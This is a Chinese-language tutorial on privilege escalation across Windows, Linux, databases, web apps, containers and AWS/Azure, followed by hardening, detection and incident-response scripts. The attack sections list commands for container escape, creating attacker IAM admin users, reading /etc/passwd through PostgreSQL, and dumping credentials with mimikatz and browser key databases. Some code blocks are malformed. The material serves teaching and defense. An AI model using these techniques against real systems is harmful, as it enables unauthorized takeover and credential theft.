# 权限提升漏洞

## 1. 权限提升漏洞概述

### 1.1 基本概念

权限提升是指攻击者通过各种手段获取超出其正常权限的系统访问级别，从普通用户权限提升到管理员/root权限的过程。

### 1.2 权限提升分类

- **垂直权限提升**：低权限用户获取高权限（如user → root）

- **水平权限提升**：同级别用户获取其他用户权限（如userA → userB）

- **上下文权限提升**：从受限环境逃逸到更宽松环境

## 2. 操作系统权限提升

### 2.1 Windows权限提升

#### 2.1.1 系统服务漏洞

```powershell
# 检查服务权限

sc qc ServiceName
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# 查找可写服务路径

Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.PathName -notlike "C:\Windows*"} 
```

#### 2.1.2 计划任务漏洞

```powershell
# 检查计划任务权限

schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

# 查找可写任务

accesschk.exe -quv users C:\Windows\Tasks 
```

#### 2.1.3 注册表漏洞

```powershell
# 检查自动启动项权限

reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# 查找可写注册表键

accesschk.exe -kuwqv "Authenticated Users" HKLM\System\CurrentControlSet\Services
```

#### 2.1.4 令牌窃取

```cpp
// 令牌窃取原理
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
ImpersonateLoggedOnUser(hToken);
```

#### 2.1.5 常见Windows提权漏洞

- **MS08-068** - SMB Relay

- **MS10-015** - KiTrap0D

- **MS16-032** - Secondary Logon Handle

- **CVE-2019-1388** - UAC绕过

### 2.2 Linux权限提升

#### 2.2.1 SUID/SGID滥用

```bash
# 查找SUID文件

find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 常见危险的SUID程序

/usr/bin/find
/usr/bin/nmap
/usr/bin/vim
/usr/bin/less
/usr/bin/more 
```

#### 2.2.2 内核漏洞利用

```bash
# 检查系统信息

uname -a
cat /etc/issue
cat /proc/version

# 常见内核提权漏洞

# Dirty Cow (CVE-2016-5195)

# Sudo Baron Samedit (CVE-2021-3156)

# PwnKit (CVE-2021-4034)
```

#### 2.2.3 能力(Capabilities)滥用

```bash
# 检查具有特殊能力的二进制文件

getcap -r / 2>/dev/null

# 常见危险能力

cap_dac_read_search # 绕过文件读权限检查
cap_setuid # 设置UID
cap_sys_admin # 系统管理权限 
```

#### 2.2.4 计划任务(Cron)漏洞

```bash
# 检查Cron任务

cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 查找可写的Cron脚本

find /etc/cron* -type f -perm -o+w 2>/dev/null 
```

#### 2.2.5 环境变量PATH滥用

```bash
# 检查PATH中的可写目录
echo $PATH | tr ":" "\n" | while read line; do ls -ld "$line"; done

# 查找可写目录
find / -writable -type d 2>/dev/null
```

## 3. 应用程序权限提升

### 3.1 数据库权限提升

#### 3.1.1 MySQL权限提升

```sql
-- 检查用户权限
SELECT user, host, authentication_string FROM mysql.user;
SHOW GRANTS FOR CURRENT_USER();

-- 尝试UDF提权
-- 利用sys_exec()等用户定义函数执行系统命令
```

#### 3.1.2 PostgreSQL权限提升

```sql
-- 检查扩展权限
SELECT * FROM pg_extension;

-- 利用大对象导入
SELECT lo_import('/etc/passwd');
```

#### 3.1.3 SQL Server权限提升

```sql
-- 检查服务器角色
SELECT IS_SRVROLEMEMBER('sysadmin')

-- 利用xp_cmdshell
EXEC xp_cmdshell 'whoami'
```

### 3.2 Web应用权限提升

#### 3.2.1 管理员功能未授权访问

```http
POST /admin/create-user HTTP/1.1
Host: target.com
Content-Type: application/json
{
 "username": "attacker",
 "role": "administrator"
}
```

#### 3.2.2 参数篡改

```http
POST /api/user/update HTTP/1.1
Content-Type: application/json
{
 "user_id": "123",
 "role": "admin", # 普通用户修改为管理员
 "permissions": ["*"]
}
```

#### 3.2.3 IDOR导致的权限提升

```http
GET /api/admin/users/456/profile HTTP/1.1

# 用户123访问用户456的管理员资料
```

## 4. 容器和环境权限提升

### 4.1 Docker权限提升

#### 4.1.1 危险挂载

```bash
挂载宿主机根目录

docker run -v /:/host -it ubuntu bash
chroot /host 
```

#### 4.1.2 特权容器逃逸

```bash
# 运行特权容器

docker run --privileged -it ubuntu bash

# 在容器内挂载宿主机文件系统

fdisk -l
mkdir /host
mount /dev/sda1 /host
chroot /host 
```

#### 4.1.3 滥用Docker Socket

```bash
# 如果挂载了Docker Socket

docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash

# 在容器内控制宿主机Docker

docker run -v /:/host -it --privileged ubuntu bash 
```

### 4.2 Kubernetes权限提升

#### 4.2.1 过高的RBAC权限

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
 name: over-privileged-binding
subjects:

- kind: ServiceAccount
  name: default
  namespace: default
  roleRef:
  kind: ClusterRole
  name: cluster-admin # 集群管理员权限
  apiGroup: rbac.authorization.k8s.io
```

#### 4.2.2 Pod安全策略绕过

```yaml
apiVersion: v1
kind: Pod
metadata:
 name: privileged-pod
spec:
 containers:

- name: test
  image: ubuntu
  securityContext:
   privileged: true # 特权模式
   capabilities:
  
  ```
  add:
  - SYS_ADMIN
  ```
```

## 5. 云环境权限提升

### 5.1 AWS IAM权限提升

#### 5.1.1 过宽的IAM策略

```json
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Action": "iam:*", // 过宽的IAM权限
 "Resource": "*"
 }
 ]
}
```

#### 5.1.2 权限提升技术

```bash
# 创建新用户并附加管理员策略

aws iam create-user --user-name attacker
aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 创建新的访问密钥

aws iam create-access-key --user-name attacker 
```

### 5.2 Azure权限提升

#### 5.2.1 过宽的Role Assignment

```powershell
# 检查当前权限

Get-AzRoleAssignment

# 尝试提升权限

New-AzRoleAssignment -SignInName "attacker@domain.com" -RoleDefinitionName "Owner" -Scope "/" 
```

## 6. 社会工程学权限提升

### 6.1 凭证窃取

#### 6.1.1 密码重用攻击

```bash
# 检查保存的浏览器密码

strings ~/.mozilla/firefox/*.default/key4.db | grep -i password

# 检查SSH密钥

ls -la ~/.ssh/ 
```

#### 6.1.2 内存凭证提取

```bash
# 使用mimipenguin提取Linux内存密码

./mimipenguin.sh

# 使用mimikatz提取Windows凭证

mimikatz # sekurlsa::logonpasswords 
```

## 7. 权限提升检测和防御

### 7.1 系统级防御

#### 7.1.1 Linux安全加固

```bash
#!/bin/bash

# Linux系统安全加固脚本

# 1. 移除危险的SUID权限

chmod u-s /usr/bin/find
chmod u-s /usr/bin/nmap
chmod u-s /usr/bin/vim

# 2. 配置sudo安全

echo "Defaults timestamp_timeout=0" >> /etc/sudoers
echo "Defaults !visiblepw" >> /etc/sudoers

# 3. 文件系统安全

chattr +i /etc/passwd
chattr +i /etc/shadow
chattr +i /etc/sudoers

# 4. 内核安全配置

echo "kernel.dmesg_restrict=1" >> /etc/sysctl.conf
echo "kernel.kptr_restrict=2" >> /etc/sysctl.conf
echo "net.core.bpf_jit_harden=2" >> /etc/sysctl.conf

# 5. 服务安全

systemctl mask debug-shell.service

#### 7.1.2 Windows安全加固

powershell

# Windows安全配置脚本

# 1. 启用UAC

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 2

# 2. 配置服务权限

sc sdset ServiceName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"

# 3. 注册表权限加固

Set-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services" -AclObject (Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services")

# 4. 计划任务权限

schtasks /change /tn "TaskName" /ru "NT AUTHORITY\SYSTEM" /rp ""
```

### 7.2 应用级防御

#### 7.2.1 权限验证中间件

```python
from functools import wraps
from flask import request, abort

def require_permission(permission):
 def decorator(f):
 @wraps(f)
 def decorated_function(*args, **kwargs):
 # 从JWT或session获取用户信息
 user = get_current_user()

```
        # 检查权限
        if not user.has_permission(permission):
            abort(403, "Insufficient permissions")

        # 检查资源所有权（水平权限）
        resource_id = kwargs.get('resource_id')
        if resource_id and not user.owns_resource(resource_id):
            abort(403, "Access denied")

        return f(*args, **kwargs)
    return decorated_function
return decorator
```

# 使用示例

@app.route('/admin/users/<user_id>')
@require_permission('admin')
def get_user(user_id):
 # 只有管理员可以访问
 pass
```

#### 7.2.2 基于属性的访问控制(ABAC)

```python
class ABACEngine:
 def __init__(self):
 self.policies = self.load_policies()

def evaluate(self, user, action, resource, context):
    for policy in self.policies:
        if self.matches_policy(policy, user, action, resource, context):
            return policy.effect == 'allow'
    return False

def matches_policy(self, policy, user, action, resource, context):
    # 检查用户属性
    if not self.check_conditions(policy.user_conditions, user):
        return False

    # 检查操作
    if action not in policy.actions:
        return False

    # 检查资源属性
    if not self.check_conditions(policy.resource_conditions, resource):
        return False

    # 检查环境上下文
    if not self.check_conditions(policy.context_conditions, context):
        return False

    return True
```



### 7.3 容器安全防御

#### 7.3.1 Docker安全配置

```yaml
docker-compose.yml 安全配置

version: '3.8'
services:
 webapp:
 image: myapp:latest
 security_opt:
 - no-new-privileges:true
 cap_drop:
 - ALL
 cap_add:
 - NET_BIND_SERVICE
 read_only: true
 tmpfs:
 - /tmp:rw,noexec,nosuid
 user: "1000:1000"
 networks:
 - frontend

networks:
 frontend:
 driver: bridge 
```

#### 7.3.2 Kubernetes安全上下文

```yaml
apiVersion: v1
kind: Pod
metadata:
 name: security-context-demo
spec:
 securityContext:
 runAsNonRoot: true
 runAsUser: 1000
 runAsGroup: 3000
 fsGroup: 2000
 containers:

- name: sec-ctx-demo
  image: nginx
  securityContext:
   allowPrivilegeEscalation: false
   capabilities:
  
  drop:
  - ALL
  
  readOnlyRootFilesystem: true
```

### 7.4 云安全防御

#### 7.4.1 AWS IAM最小权限

```json
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Action": [
 "s3:GetObject",
 "s3:PutObject"
 ],
 "Resource": "arn:aws:s3:::my-bucket/*"
 }
 ]
}
```

#### 7.4.2 Azure RBAC最小权限

```json
{
 "Name": "Reader Only",
 "IsCustom": true,
 "Description": "Read only access",
 "Actions": [
 "Microsoft.Resources/subscriptions/resourceGroups/read"
 ],
 "NotActions": [],
 "DataActions": [],
 "NotDataActions": []
}
```

## 8. 检测和监控

### 8.1 权限提升检测

#### 8.1.1 Linux异常检测

```bash
#!/bin/bash
# 权限提升检测脚本

# 监控SUID文件变化
find / -perm -4000 -type f > /var/log/suid_baseline.txt
# 定期比较：find / -perm -4000 -type f | diff /var/log/suid_baseline.txt -

# 监控特权进程
ps aux | awk '$1=="root" {print $2}' | while read pid; do
    cat /proc/$pid/status | grep -q "Uid:[[:space:]]*0[[:space:]]*0"
    if [ $? -ne 0 ]; then
        echo "Suspicious root process: $pid"
    fi
done

# 监控sudo使用
tail -f /var/log/auth.log | grep -i "sudo.*COMMAND"
```

#### 8.1.2 Windows异常检测

```powershell
# 监控特权操作

Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4672} | 
Where-Object {$_.Message -like "*Special privileges assigned to new logon*"}

# 监控服务创建

Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045}

# 监控计划任务创建

Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TaskScheduler/Operational'; ID=106}
```

### 8.2 安全审计工具

#### 8.2.1 Linux审计工具

```bash
使用Lynis进行安全审计

lynis audit system

# 使用LinPEAS进行权限提升检查

./linpeas.sh

# 使用Linux Exploit Suggester

./linux-exploit-suggester.sh 
```

#### 8.2.2 Windows审计工具

```powershell
# 使用WinPEAS

.\winpeas.exe

# 使用PowerUp

Import-Module .\PowerUp.ps1
Invoke-AllChecks

# 使用Windows Exploit Suggester

python windows-exploit-suggester.py --database 2021-06-15-mssb.xlsx --systeminfo systeminfo.txt 
```

## 9. 应急响应

### 9.1 权限提升事件响应

#### 9.1.1 检测到权限提升攻击

```bash
#!/bin/bash

# 权限提升事件响应脚本

echo "=== Privilege Escalation Incident Response ==="

# 1. 立即隔离系统

echo "1. Isolating system from network..."
ifconfig eth0 down

# 2. 保存当前状态

echo "2. Saving system state..."
ps aux > /tmp/processes_$(date +%s).txt
netstat -tunap > /tmp/network_$(date +%s).txt
lsof > /tmp/open_files_$(date +%s).txt

# 3. 检查用户和权限

echo "3. Checking users and privileges..."
cat /etc/passwd
cat /etc/sudoers
last

# 4. 检查SUID文件

echo "4. Checking SUID files..."
find / -perm -4000 -type f 2>/dev/null

# 5. 检查计划任务

echo "5. Checking scheduled tasks..."
crontab -l
ls -la /etc/cron*

# 6. 检查服务

echo "6. Checking services..."
systemctl list-units --type=service
```

#### 9.1.2 修复和恢复

```bash
#!/bin/bash

# 权限提升修复脚本

# 1. 撤销非法权限

echo "Revoking unauthorized permissions..."
usermod -G "" compromised_user
chsh -s /bin/false compromised_user

# 2. 移除恶意文件

echo "Removing malicious files..."
rm -f /tmp/malicious_suid
rm -f /etc/cron.hourly/backdoor

# 3. 修复文件权限

echo "Fixing file permissions..."
chmod 755 /usr/bin/sudo
chmod 644 /etc/passwd
chmod 600 /etc/shadow

# 4. 重置SSH密钥

echo "Resetting SSH keys..."
rm -f /home/*/.ssh/authorized_keys
rm -f /root/.ssh/authorized_keys

# 5. 更新系统

echo "Updating system..."
apt update && apt upgrade -y
```

## 10. 最佳实践总结

### 10.1 预防措施

1. **最小权限原则**：用户和进程只拥有必要的最小权限

2. **定期更新**：及时安装安全补丁

3. **安全配置**：遵循安全基线配置

4. **监控审计**：实时监控特权操作

5. **纵深防御**：多层安全控制

### 10.2 持续安全

```yaml
持续安全监控配置

monitoring:
 file_integrity:
 paths:
 - /usr/bin
 - /etc/passwd
 - /etc/shadow
 alert_on_change: true

privilege_escalation:
 monitor_suid: true
 monitor_sudo: true
 monitor_capabilities: true

user_management:
 monitor_new_users: true
 monitor_sudoers_changes: true
```

# 


